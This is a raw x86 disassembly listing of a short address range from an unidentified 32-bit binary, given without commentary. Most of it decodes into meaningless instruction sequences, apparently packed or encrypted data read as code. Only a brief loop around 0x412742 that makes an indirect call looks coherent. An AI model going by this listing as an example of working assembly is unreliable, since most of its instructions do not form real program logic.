  4121d0:	xchg   ebp,eax
  4121d2:	push   edi
  4121d3:	and    ch,dl
  4121d5:	lods   eax,DWORD PTR ds:[esi]
  4121d6:	jl     0x4121a9
  4121d8:	or     dl,BYTE PTR [ecx]
  4121da:	adc    bh,0xf9
  4121dd:	sbb    ch,ch
  4121df:	stc    
  4121e0:	scas   al,BYTE PTR es:[edi]
  4121e1:	sub    DWORD PTR [edx-0x56],edi
  4121e4:	jae    0x412227
  4121e6:	xchg   edi,eax
  4121e7:	pop    es
  4121e8:	and    DWORD PTR [ebx],0x3
  4121eb:	sbb    al,0x7e
  4121ed:	sbb    BYTE PTR [esi+eiz*4+0x2f803a8d],0x66
  4121f5:	jne    0x4121e4
  4121f7:	loopne 0x412258
  4121f9:	out    dx,eax
  4121fa:	jnp    0x41221d
  4121fc:	push   eax
  4121fd:	mov    eax,0xefd3278
  412202:	mov    ah,0x93
  412204:	jne    0x4121ac
  412206:	rcl    BYTE PTR ds:0x218358b2,cl
  41220c:	pushf  
  41220d:	and    ebp,DWORD PTR [ebx-0x2e2a60c1]
  412213:	fs ins DWORD PTR es:[edi],dx
  412215:	sbb    ch,cl
  412217:	ret    0x2d0e
  41221a:	mov    WORD PTR [edi-0x3dd38704],?
  412220:	scas   eax,DWORD PTR es:[edi]
  412221:	pop    edx
  412222:	push   eax
  412224:	cmp    BYTE PTR [eax],ah
  412226:	and    edi,DWORD PTR [edx+esi*2]
  412229:	xchg   edi,eax
  41222a:	push   0xf7491e9e
  41222f:	add    eax,0xac500853
  412234:	mov    edi,0x32438c9b
  412239:	mov    ch,0x43
  41223b:	ins    BYTE PTR es:[edi],dx
  41223c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41223d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41223e:	and    eax,0x1290395f
  412243:	bound  ecx,QWORD PTR [bx+0x2429]
  412248:	shr    BYTE PTR [ebp+ebx*2+0x76],1
  41224c:	cmp    eax,0xf2424ba4
  412251:	jne    0x4121d5
  412253:	fsubr  st(5),st
  412255:	xchg   edx,eax
  412256:	mov    bh,0xe2
  412258:	loop   0x41227c
  41225a:	(bad)  
  41225b:	jnp    0x4121f5
  41225d:	push   edx
  41225e:	jne    0x412251
  412260:	nop
  412261:	loopne 0x4122df
  412263:	pop    ebx
  412264:	outs   dx,DWORD PTR ds:[esi]
  412265:	pop    es
  412266:	mov    ebx,0xf4a223f0
  41226b:	mov    al,ds:0x56fe283a
  412270:	jl     0x412280
  412272:	inc    esi
  412273:	cdq    
  412274:	imul   ecx,DWORD PTR [esi+0x35e78168],0x4e
  41227b:	fisttp WORD PTR [edx-0x3f]
  41227e:	or     bh,BYTE PTR [esi+0x59]
  412281:	pop    esp
  412282:	pushf  
  412283:	pop    edx
  412284:	arpl   WORD PTR [ebx-0x5aa06b2b],si
  41228a:	push   ss
  41228b:	sbb    ah,BYTE PTR [ebp+0x26854c03]
  412291:	adc    eax,0x56628ec6
  412296:	push   edi
  412297:	loop   0x412258
  412299:	jle    0x412241
  41229b:	sbb    al,0xa8
  41229d:	loop   0x412254
  41229f:	adc    ebx,ebx
  4122a1:	xor    al,0x7
  4122a3:	inc    esi
  4122a4:	add    al,0xe5
  4122a6:	xchg   edx,eax
  4122a7:	retf   
  4122a8:	cmp    ebx,DWORD PTR [edx-0x2]
  4122ab:	int    0xb8
  4122ad:	sbb    dh,BYTE PTR [ebx+0x4dd1a40e]
  4122b3:	jmp    0x41224b
  4122b5:	cmp    al,0xb8
  4122b7:	into   
  4122b8:	fimul  WORD PTR [eax+0x4477858e]
  4122be:	mov    esi,DWORD PTR [eax+0x70e8c344]
  4122c4:	out    dx,al
  4122c5:	xor    eax,0x928f2903
  4122ca:	xor    al,0xa9
  4122cc:	jge    0x4122ff
  4122ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122cf:	outs   dx,DWORD PTR ds:[esi]
  4122d0:	xor    dl,BYTE PTR [edx-0xac77443]
  4122d6:	inc    ecx
  4122d7:	popf   
  4122d8:	ret    0x45c4
  4122db:	mov    ecx,0x7e99ca58
  4122e0:	or     al,0xbb
  4122e2:	xchg   ebp,eax
  4122e3:	clc    
  4122e4:	sti    
  4122e5:	mov    dh,0x6a
  4122e7:	push   cs
  4122e8:	sahf   
  4122e9:	jbe    0x4122bd
  4122eb:	loopne 0x4122e6
  4122ed:	push   esp
  4122ee:	icebp  
  4122ef:	rcr    DWORD PTR [ebx],1
  4122f1:	jle    0x412335
  4122f3:	cdq    
  4122f4:	mov    ch,0xad
  4122f6:	and    eax,0xd67b4c1e
  4122fb:	and    ah,bh
  4122fd:	ja     0x4122fb
  4122ff:	(bad)  
  412300:	ror    BYTE PTR [eax],1
  412302:	scas   al,BYTE PTR es:[edi]
  412303:	pop    eax
  412304:	sbb    ah,bl
  412306:	inc    esp
  412307:	xor    al,0x5b
  412309:	xchg   ebx,ecx
  41230b:	xchg   ebx,eax
  41230c:	ja     0x412293
  41230e:	sbb    al,0x9
  412310:	ret    0x235a
  412313:	lds    ebx,FWORD PTR [ecx]
  412315:	xchg   ecx,eax
  412316:	push   ebp
  412317:	nop
  412318:	mov    bl,0xb
  41231a:	sahf   
  41231b:	mov    bl,0xbe
  41231d:	pop    eax
  41231e:	mov    ecx,ecx
  412320:	scas   al,BYTE PTR es:[edi]
  412321:	stc    
  412322:	sub    DWORD PTR [eax-0x5c],edi
  412325:	mov    dl,0x24
  412327:	sub    al,0x7
  412329:	xchg   esi,eax
  41232a:	sbb    dh,dl
  41232c:	inc    ecx
  41232d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41232e:	xor    dh,ch
  412330:	pop    eax
  412331:	sub    DWORD PTR [ebp-0x2d],0x74
  412335:	mov    gs,WORD PTR [ebx]
  412337:	mov    cl,0xe0
  412339:	(bad)  
  41233a:	fidiv  WORD PTR [ecx+0x5340e00c]
  412340:	je     0x41235b
  412342:	cmp    eax,0xf9735190
  412347:	ds pop esi
  412349:	mov    ah,0xf8
  41234b:	outs   dx,BYTE PTR ds:[esi]
  41234c:	xor    ecx,DWORD PTR [esi+0x6d446404]
  412352:	cdq    
  412353:	fbld   TBYTE PTR [edi+eax*1]
  412356:	or     ebx,ebp
  412358:	or     BYTE PTR [ecx+0x4c],bh
  41235b:	(bad)
  41235f:	loop   0x4123b3
  412361:	sbb    DWORD PTR [eax],ecx
  412363:	jb     0x4122fa
  412365:	push   ds
  412366:	mov    dl,0xe6
  412368:	mov    dh,0x7
  41236a:	data16 and BYTE PTR [esi+0x78853a76],dh
  412371:	rol    BYTE PTR [edx],1
  412373:	adc    ecx,DWORD PTR [edi-0xf13a74a]
  412379:	loopne 0x412375
  41237b:	ds out dx,eax
  41237d:	or     edi,edx
  41237f:	push   ss
  412380:	fsubr  QWORD PTR [ecx-0x606f9f89]
  412386:	iret   
  412387:	ds pop esp
  412389:	jns    0x41236b
  41238b:	xchg   esp,eax
  41238c:	mov    edi,0xb44d7ba0
  412391:	xor    dh,BYTE PTR [edi]
  412393:	(bad)  
  412395:	sbb    bl,bh
  412397:	jle    0x4123fc
  412399:	fldenv [ebp+0x3b1471a8]
  41239f:	mov    ecx,0x9813d709
  4123a4:	or     DWORD PTR [esi],eax
  4123a6:	pop    edx
  4123a7:	int    0x2c
  4123a9:	repnz stos BYTE PTR es:[edi],al
  4123ab:	aas    
  4123ac:	fstp   QWORD PTR [edx]
  4123ae:	scas   eax,DWORD PTR es:[edi]
  4123af:	inc    ebp
  4123b0:	repz mov WORD PTR [edx],ss
  4123b3:	loope  0x41235f
  4123b5:	or     eax,0x5c942917
  4123ba:	mov    al,ds:0xc84b3b91
  4123bf:	repnz imul edi,DWORD PTR [ebp+0x32b96589],0xb312e6ed
  4123ca:	and    DWORD PTR [esi+eiz*2+0x737b8672],ecx
  4123d1:	push   es
  4123d2:	mov    ebx,0x6b834204
  4123d7:	cmp    ecx,DWORD PTR [edi]
  4123d9:	std    
  4123da:	jbe    0x412446
  4123dc:	push   ebx
  4123dd:	sbb    al,0x5e
  4123df:	mov    esi,0xf4046927
  4123e4:	sub    cl,BYTE PTR [ecx+0x3e4f2e95]
  4123ea:	dec    esp
  4123eb:	adc    BYTE PTR [ebx-0x1f],bl
  4123ee:	push   ss
  4123ef:	aaa    
  4123f0:	mov    eax,ds:0xc89f4a27
  4123f5:	gs sti 
  4123f7:	push   cs
  4123f8:	xchg   BYTE PTR ds:0xf95a8ef4,ah
  4123fe:	xor    BYTE PTR [eax],bh
  412400:	inc    esp
  412401:	and    al,0x48
  412403:	daa    
  412404:	push   ebp
  412405:	sub    ebp,DWORD PTR [edi-0x69]
  412408:	pop    edi
  412409:	add    eax,0xd0702784
  41240e:	in     eax,0x10
  412410:	xor    cl,BYTE PTR ds:0x70e75e20
  412416:	cmp    al,0x41
  412418:	test   al,0xb4
  41241a:	mov    ch,0x70
  41241c:	jge    0x412434
  41241e:	rcl    DWORD PTR [eax],cl
  412420:	mov    ecx,0x4ae549aa
  412425:	sbb    BYTE PTR [ebx],ah
  412427:	sti    
  412428:	test   DWORD PTR [edx-0x79],edx
  41242b:	xchg   BYTE PTR [edi],al
  41242d:	lods   al,BYTE PTR ds:[esi]
  41242e:	(bad)  
  41242f:	jecxz  0x412475
  412431:	andps  xmm0,XMMWORD PTR [edi+0x78]
  412435:	ror    DWORD PTR [edx+0x3c],1
  412438:	push   0xffffffc7
  41243a:	fiadd  DWORD PTR [esi]
  41243c:	out    dx,eax
  41243d:	mov    dl,0x7d
  41243f:	dec    eax
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	push   edx
  41245e:	ror    DWORD PTR [esp+ebp*2],1
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xf970707e
  41246a:	iret   
  41246b:	sbb    bh,BYTE PTR [ecx]
  41246d:	dec    ebx
  41246e:	enter  0x5d7e,0x83
  412472:	jle    0x412433
  412474:	mov    esi,0xf197f410
  412479:	popa   
  41247a:	mov    dh,0x36
  41247c:	mov    edi,0x80e4d7cb
  412481:	sbb    eax,0xa29afeee
  412486:	inc    ebp
  412487:	addr16 out dx,eax
  412489:	mov    ebx,0x550ef20f
  41248e:	sub    BYTE PTR [edx+eax*4+0x384dd056],al
  412495:	pop    esp
  412496:	cmp    BYTE PTR [esi],cl
  412498:	test   al,0xbb
  41249a:	outs   dx,DWORD PTR ds:[esi]
  41249b:	mov    edx,0x261a56c5
  4124a0:	jno    0x412454
  4124a2:	mov    ebp,0x5a24c125
  4124a7:	jne    0x412512
  4124a9:	test   eax,0x7aebed90
  4124ae:	jne    0x41247b
  4124b0:	ins    BYTE PTR es:[edi],dx
  4124b1:	sbb    al,0xae
  4124b3:	fdiv   DWORD PTR [edx-0x4a]
  4124b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124b7:	xor    dh,bh
  4124b9:	dec    edi
  4124ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124bb:	in     eax,dx
  4124bc:	arpl   WORD PTR [ebp-0x3c58de1f],dx
  4124c2:	std    
  4124c3:	stos   DWORD PTR es:[edi],eax
  4124c4:	sub    al,0xa1
  4124c6:	mov    ah,0xc8
  4124c8:	push   edx
  4124c9:	mov    dh,0x9
  4124cb:	inc    esi
  4124cc:	dec    edx
  4124cd:	pop    ebp
  4124ce:	fmul   QWORD PTR [edi-0x1b7d5199]
  4124d4:	bound  edi,QWORD PTR [edx+0xe735a42]
  4124da:	leavew 
  4124dc:	xor    BYTE PTR [esi-0x1a],ah
  4124df:	addr16 sti 
  4124e1:	inc    eax
  4124e2:	call   0x53f77e85
  4124e7:	pop    es
  4124e8:	(bad)  
  4124e9:	scas   al,BYTE PTR es:[edi]
  4124ea:	or     eax,0x42fca471
  4124ef:	push   es
  4124f0:	xchg   ebx,eax
  4124f1:	(bad)  
  4124f5:	pop    edi
  4124f6:	jecxz  0x4124e5
  4124f8:	jb     0x41254a
  4124fa:	mov    WORD PTR [ebp+0x56],?
  4124fd:	sub    dh,BYTE PTR [ebx-0x51]
  412500:	xlat   BYTE PTR ds:[ebx]
  412501:	stos   BYTE PTR es:[edi],al
  412502:	sub    eax,0x89980bc1
  412507:	mov    ebp,0x5bb278c4
  41250c:	jo     0x412526
  41250e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41250f:	push   ds
  412510:	addr16 push esi
  412512:	(bad)  [ecx+ebp*8-0x5bdead15]
  412519:	cmc    
  41251a:	jne    0x4124f9
  41251c:	pop    eax
  41251d:	sbb    ebx,DWORD PTR [edx+0x4060332b]
  412523:	mov    WORD PTR [ebx],gs
  412525:	cld    
  412526:	jns    0x41257f
  412528:	adc    BYTE PTR [ebx],bl
  41252a:	dec    edx
  41252b:	add    al,0xcb
  41252d:	pop    eax
  41252e:	ss push edx
  412530:	mov    edx,0x23713fb8
  412535:	lds    edi,FWORD PTR [edi-0x6dcf9394]
  41253b:	mov    ds:0xe9226a53,eax
  412540:	call   0xf98bdd28
  412545:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412547:	rol    BYTE PTR [esi],1
  412549:	push   0xf77c07f6
  41254e:	imul   edx,DWORD PTR [edi-0x5d],0x63
  412552:	mov    bl,ch
  412554:	mov    esi,0xf531cc95
  412559:	pop    es
  41255a:	std    
  41255b:	(bad)  
  41255c:	leave  
  41255d:	test   edx,ecx
  41255f:	sbb    al,0xd0
  412561:	imul   esp,DWORD PTR [ecx],0x50
  412564:	push   es
  412565:	pushf  
  412566:	pop    ecx
  412567:	fwait
  412568:	rcr    DWORD PTR [edi-0x16],1
  41256b:	call   0xb76c1963
  412570:	adc    DWORD PTR [edx],esi
  412572:	lock loopne 0x4125d3
  412575:	js     0x4125e1
  412577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412578:	mov    es,WORD PTR [ebp+ebp*4+0x4bb99a84]
  41257f:	arpl   WORD PTR [ecx-0x3c],sp
  412582:	mov    esp,0xb98ccede
  412587:	mov    ?,ebp
  412589:	test   BYTE PTR [ebx-0x22],cl
  41258c:	lods   al,BYTE PTR ds:[esi]
  41258d:	xchg   edi,eax
  41258e:	xor    al,0xcf
  412590:	es jge 0x412589
  412593:	in     eax,dx
  412594:	repz push 0xffffff8b
  412597:	aam    0x6e
  412599:	gs cld 
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	xchg   BYTE PTR [ebp-0x3f],bl
  41259f:	fsubr  QWORD PTR [ebp+0x71]
  4125a2:	out    0x89,eax
  4125a4:	ror    BYTE PTR [edx],1
  4125a6:	jmp    0xadbde1ac
  4125ab:	in     al,0x40
  4125ad:	jne    0x412551
  4125af:	loopne 0x4125c0
  4125b1:	ret    0x8c91
  4125b4:	fisttp DWORD PTR [esi-0x5da6789a]
  4125ba:	pop    edx
  4125bb:	mov    edi,0xb64dffe0
  4125c0:	dec    ebp
  4125c1:	in     al,dx
  4125c2:	inc    eax
  4125c3:	push   0xffffffa4
  4125c5:	xchg   edi,eax
  4125c6:	adc    BYTE PTR [ecx+ecx*2],0x84
  4125ca:	retf   
  4125cb:	dec    edx
  4125cc:	or     eax,ebx
  4125ce:	in     eax,0xca
  4125d0:	jns    0x412597
  4125d2:	mov    ah,0x93
  4125d4:	fmul   st,st(6)
  4125d6:	fwait
  4125d7:	aam    0xf8
  4125d9:	pop    ebp
  4125da:	ror    ebp,0xf
  4125dd:	sub    al,0xe1
  4125df:	(bad)  
  4125e0:	push   edx
  4125e1:	pop    esp
  4125e2:	sbb    al,0x9b
  4125e4:	neg    BYTE PTR ds:[ecx-0x4e]
  4125e8:	pop    ebp
  4125e9:	(bad)  
  4125eb:	repz imul ecx,ebx,0x4ecd3804
  4125f2:	mov    al,0x2f
  4125f4:	or     edx,ebp
  4125f6:	repnz sbb al,BYTE PTR [esi]
  4125f9:	shl    esi,1
  4125fb:	mov    WORD PTR [ecx-0x7955b7d1],es
  412601:	pop    ecx
  412602:	loop   0x4125b5
  412604:	scas   eax,DWORD PTR es:[edi]
  412605:	outs   dx,DWORD PTR ds:[esi]
  412606:	mov    WORD PTR [edi+0x3c52d187],gs
  41260c:	fnstcw WORD PTR [ecx+0x6]
  41260f:	xchg   BYTE PTR [esi-0x5e94a78b],bl
  412615:	outs   dx,BYTE PTR ds:[esi]
  412616:	add    DWORD PTR [esi-0xf4fe837],0x20aab209
  412620:	jae    0x41267c
  412622:	cmc    
  412623:	push   edx
  412624:	(bad)
  412628:	jno    0x412662
  41262a:	scas   al,BYTE PTR es:[edi]
  41262b:	jne    0x41268b
  41262d:	daa    
  41262e:	lahf   
  41262f:	mov    ah,0x99
  412631:	push   edx
  412632:	cdq    
  412633:	adc    ecx,DWORD PTR ds:0xa188bb7b
  412639:	sub    BYTE PTR [edi+0x62],cl
  41263c:	push   ss
  41263d:	cmp    DWORD PTR ds:0x30784106,edi
  412643:	stos   BYTE PTR es:[edi],al
  412644:	loope  0x4125dc
  412646:	stc    
  412647:	add    eax,0xa3f86dbd
  41264c:	add    ah,BYTE PTR [esi-0x55]
  41264f:	ds adc al,0xe3
  412652:	cli    
  412653:	int3   
  412654:	mov    al,0x1b
  412656:	je     0x4125d9
  412658:	cdq    
  412659:	mov    al,BYTE PTR [eax-0x70af1967]
  41265f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412660:	jge    0x412693
  412662:	stos   DWORD PTR es:[edi],eax
  412663:	fmul   st(0),st
  412665:	sar    DWORD PTR [edi*1+0x3315750e],cl
  41266c:	dec    edi
  41266d:	je     0x4126e2
  41266f:	ret    
  412670:	mov    ds:0xe2b4658c,eax
  412675:	sbb    eax,0x7013377a
  41267a:	stc    
  41267b:	cmp    DWORD PTR [eax+0x1d57aaf7],0xffffff8e
  412682:	daa    
  412683:	add    al,0xd1
  412685:	shufps xmm4,xmm3,0x9
  412689:	mov    ecx,0x8973ada8
  41268e:	test   DWORD PTR [eax],ebx
  412690:	dec    edi
  412691:	pusha  
  412692:	or     bh,al
  412694:	xor    DWORD PTR [ebp-0x7b7a1a3f],esi
  41269a:	pop    ebx
  41269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41269c:	repz xor bl,BYTE PTR [eax-0x45b5d2fd]
  4126a3:	dec    eax
  4126a4:	jecxz  0x4126d3
  4126a6:	sbb    ch,BYTE PTR [eax]
  4126a8:	or     ah,BYTE PTR ds:0xdfc10c65
  4126ae:	enter  0x4d39,0xe8
  4126b2:	mov    cl,0x90
  4126b4:	add    BYTE PTR [edi-0x16f55875],dl
  4126ba:	and    dl,dh
  4126bc:	inc    BYTE PTR [edx-0x25]
  4126bf:	mov    dl,0xc5
  4126c1:	pusha  
  4126c2:	xchg   edx,eax
  4126c3:	ret    
  4126c4:	das    
  4126c5:	iret   
  4126c6:	jle    0x412732
  4126c8:	jnp    0x41273d
  4126ca:	fdiv   st,st(5)
  4126cc:	push   esp
  4126cd:	sti    
  4126ce:	fwait
  4126cf:	mov    esi,0x9bbac721
  4126d4:	sub    DWORD PTR [ecx+0x32],edx
  4126d7:	das    
  4126d8:	gs and ah,cl
  4126db:	popf   
  4126dc:	out    dx,al
  4126dd:	or     ch,BYTE PTR [ecx-0x59]
  4126e0:	mov    bh,0xed
  4126e2:	(bad)  
  4126e3:	and    eax,0x3f0ed490
  4126e8:	adc    BYTE PTR [esi+0x1b],0x18
  4126ec:	pop    es
  4126ed:	cli    
  4126ee:	xadd   BYTE PTR [esi+ebp*2+0x6301d867],cl
  4126f6:	and    BYTE PTR [edx-0x7],ah
  4126f9:	test   DWORD PTR [esi-0xb],0xbed3dacf
  412700:	(bad)  
  412701:	arpl   WORD PTR [edx+0x40],dx
  412704:	push   ds
  412705:	aaa    
  412706:	jmp    0xe6489149
  41270b:	mov    ch,0xed
  41270d:	and    al,0xa2
  41270f:	gs lock xchg edi,eax
  412712:	out    dx,eax
  412713:	or     ebp,DWORD PTR [ebx]
  412715:	and    bl,ch
  412717:	inc    ebx
  412718:	pop    esi
  412719:	imul   ecx,DWORD PTR [ebp-0x50c40dc4],0x3e6a176d
  412723:	pop    edx
  412724:	jg     0x41272b
  412726:	mov    al,0xeb
  412728:	pop    ss
  412729:	and    ch,BYTE PTR [edx-0x48]
  41272c:	dec    ebx
  41272d:	push   0x4d892450
  412732:	in     al,0x81
  412734:	and    eax,0x42fd76
  412739:	add    BYTE PTR [eax],al
  41273b:	add    BYTE PTR [eax],al
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebp,DWORD PTR [eax+0x2f]
  4127bf:	out    dx,eax
  4127c0:	xchg   edi,eax
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0x9c70707e
  4127ca:	jns    0x412849
  4127cc:	stos   BYTE PTR es:[edi],al
  4127cd:	aam    0xbb
  4127cf:	out    0x9a,al
  4127d1:	push   ebp
  4127d2:	int3   
  4127d3:	fisubr DWORD PTR [edx-0x77]
  4127d6:	push   ecx
  4127d8:	stc    
  4127d9:	scas   al,BYTE PTR es:[edi]
  4127da:	pop    edx
  4127db:	ins    BYTE PTR es:[edi],dx
  4127dc:	xor    dl,ch
  4127de:	call   0xaa99ad17
  4127e3:	sti    
  4127e4:	retf   
  4127e5:	retf   
  4127e6:	out    0x14,al
  4127e8:	xchg   esi,eax
  4127e9:	adc    BYTE PTR ds:0xeccfacc5,bl
  4127ef:	adc    eax,DWORD PTR [ecx+0x33]
  4127f2:	test   BYTE PTR [ebx-0x65],cl
  4127f5:	lock stos WORD PTR es:[edi],ax
  4127f8:	fwait
  4127f9:	outs   dx,DWORD PTR ds:[esi]
  4127fa:	mov    edx,0x99624d00
  4127ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412800:	in     eax,0x95
  412802:	std    
  412803:	jbe    0x4127c8
  412805:	mov    ch,0x7e
  412807:	jb     0x412873
  412809:	mov    esp,0x15d4c1e1
  41280e:	fiadd  DWORD PTR [esi-0x5e]
  412811:	cmp    al,cl
  412813:	inc    ebx
  412814:	jl     0x412885
  412816:	mov    bl,0x34
  412818:	or     eax,0x5829b54
  41281d:	addr16 in eax,0xcb
  412820:	int    0x6a
  412822:	jmp    0x5dd5:0x22f9d26f
  412829:	pop    esi
  41282a:	dec    esp
  41282b:	add    ecx,DWORD PTR [ebp+0x1d4c4f91]
  412831:	sub    eax,0x9cd76a38
  412836:	nop
  412837:	pop    ss
  412838:	call   0xc8dc:0x952ca63d
  41283f:	(bad)  
  412840:	xchg   ecx,eax
  412841:	or     dl,ch
  412843:	sbb    eax,0x7093d3ab
  412848:	shl    ch,1
  41284a:	ror    BYTE PTR [ebp+0x13c67b10],1
  412850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412851:	pushf  
  412852:	mov    eax,ds:0x8696e208
  412857:	pop    ecx
  412858:	xchg   ecx,eax
  412859:	lock int3 
  41285b:	adc    BYTE PTR [esi-0x40023534],0x56
  412862:	xor    cl,0x6
  412865:	inc    ecx
  412866:	cmp    BYTE PTR [edx+0x17fd1d87],dl
  41286c:	je     0x412877
  41286e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41286f:	cli    
  412870:	out    0x62,eax
  412872:	les    ebp,FWORD PTR [edx]
  412874:	fsub   st(3),st
  412876:	outs   dx,DWORD PTR ds:[esi]
  412877:	push   edx
  412878:	aad    0xd1
  41287a:	rcr    ebx,cl
  41287c:	mov    esi,eax
  41287e:	fs mov al,0xd4
  412881:	fdivr  DWORD PTR [eax+0x2edcea69]
  412887:	push   es
  412888:	jge    0x412844
  41288a:	fs push 0x9a5f11c4
  412890:	cs addr16 push cs
  412893:	rol    edi,1
  412895:	loop   0x412864
  412897:	mov    ecx,0xc5cbaee9
  41289c:	scas   al,BYTE PTR es:[edi]
  41289d:	push   esi
  41289e:	mov    eax,ss:0xa3bb63cb
  4128a4:	ficom  WORD PTR [eax]
  4128a6:	mov    bl,0xd0
  4128a8:	ins    DWORD PTR es:[edi],dx
  4128a9:	push   ss
  4128aa:	mov    cl,0x24
  4128ac:	lahf   
  4128ad:	push   edi
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	mul    BYTE PTR [ebx]
  4128b1:	sub    DWORD PTR [ebp-0x16],esp
  4128b4:	push   esp
  4128b5:	add    al,0xc5
  4128b7:	jne    0x41285d
  4128b9:	jmp    0xb2a016f7
  4128be:	sar    dh,1
  4128c0:	mov    al,ds:0x5bf345eb
  4128c5:	cwde   
  4128c6:	mov    ds:0xf71afb32,al
  4128cb:	sub    DWORD PTR [edx],eax
  4128cd:	inc    esp
  4128ce:	lock mov al,0xd0
  4128d1:	outs   dx,DWORD PTR ds:[esi]
  4128d2:	cdq    
  4128d3:	mov    BYTE PTR ss:[esi+0x2],ch
  4128d7:	lock push esi
  4128d9:	arpl   WORD PTR [ebx-0x7d07ef73],sp
  4128df:	cmp    eax,0xdb5d1c9c
  4128e4:	xchg   ebx,eax
  4128e5:	lods   eax,DWORD PTR ds:[esi]
  4128e6:	stc    
  4128e7:	loop   0x4128c7
  4128e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ea:	and    eax,0xe9bd5215
  4128ef:	mov    BYTE PTR [ebx+0x44a807f],bh
  4128f5:	pop    ss
  4128f6:	sub    al,0x30
  4128f8:	cmp    bh,0xd1
  4128fb:	sar    DWORD PTR [edx+ebx*1],1
  4128fe:	mov    edi,DWORD PTR [edx]
  412900:	das    
  412901:	xchg   edx,eax
  412902:	jg     0x41294d
  412904:	dec    ah
  412906:	cmp    ebp,ebp
  412908:	or     eax,0x3f91d98
  41290d:	or     ebx,ebp
  41290f:	das    
  412910:	scas   eax,DWORD PTR es:[edi]
  412911:	xchg   edi,eax
  412912:	xchg   ebp,eax
  412913:	je     0x412902
  412915:	scas   eax,DWORD PTR es:[edi]
  412916:	cmp    ebp,DWORD PTR [ebx+0x4d]
  412919:	stos   BYTE PTR es:[edi],al
  41291a:	lds    esi,FWORD PTR [ebx]
  41291c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41291d:	push   di
  41291f:	lds    edx,FWORD PTR [edi]
  412921:	int3   
  412922:	sbb    BYTE PTR [ebx-0x56],bl
  412925:	mov    al,ds:0x7f7df5fa
  41292a:	sbb    DWORD PTR [edi-0x25916b0d],ebp
  412930:	cmp    cl,0x94
  412933:	add    BYTE PTR [ecx+0x14ea1195],cl
  412939:	fucom  st(7)
  41293b:	push   esp
  41293c:	xchg   edi,eax
  41293d:	sub    ah,dl
  41293f:	jno    0x4129b0
  412941:	fisttp WORD PTR [ebp+ecx*8-0xa]
  412945:	lods   eax,DWORD PTR ds:[esi]
  412946:	xor    al,0xc6
  412948:	push   cs
  412949:	or     al,0x27
  41294b:	jae    0x412911
  41294d:	imul   esp,eax,0x77
  412950:	add    eax,0x7d48fd6d
  412955:	and    eax,0xdfedceda
  41295a:	dec    eax
  41295b:	cdq    
  41295c:	cmp    al,0x94
  41295e:	cmp    BYTE PTR ds:0xd3a9b4a8,0x56
  412965:	cmp    ecx,DWORD PTR [ebp+0x743a3427]
  41296b:	sub    al,0xe8
  41296d:	sbb    bl,al
  41296f:	jns    0x41291b
  412971:	jge    0x412940
  412973:	scas   al,BYTE PTR es:[edi]
  412974:	vaddsubpd ymm7,ymm1,YMMWORD PTR [esi]
  412978:	repz push edx
  41297a:	ss (bad) 
  41297c:	les    ebx,FWORD PTR [ebx-0x47]
  41297f:	ds pop ebp
  412981:	nop
  412982:	sahf   
  412983:	jecxz  0x4129e9
  412985:	call   0x75d:0xc9daf762
  41298c:	sar    DWORD PTR [eax-0x5a],0x88
  412990:	pop    ds
  412991:	es mov ah,0xc5
  412994:	imul   esi,DWORD PTR [edx-0x30],0x39
  412998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412999:	mov    esp,0xbe0d4e06
  41299e:	jmp    0x664e:0xf3276ea7
  4129a5:	and    eax,0x4b7f49e7
  4129aa:	xor    ebx,0xd5f6997e
  4129b0:	xchg   edi,eax
  4129b1:	sub    eax,0xa2556f21
  4129b6:	sbb    eax,0x15288183
  4129bb:	aam    0x6
  4129bd:	cmp    eax,DWORD PTR [esi-0x65]
  4129c0:	sbb    BYTE PTR [edi+ebx*1-0xbb071],bh
  4129c7:	push   ebp
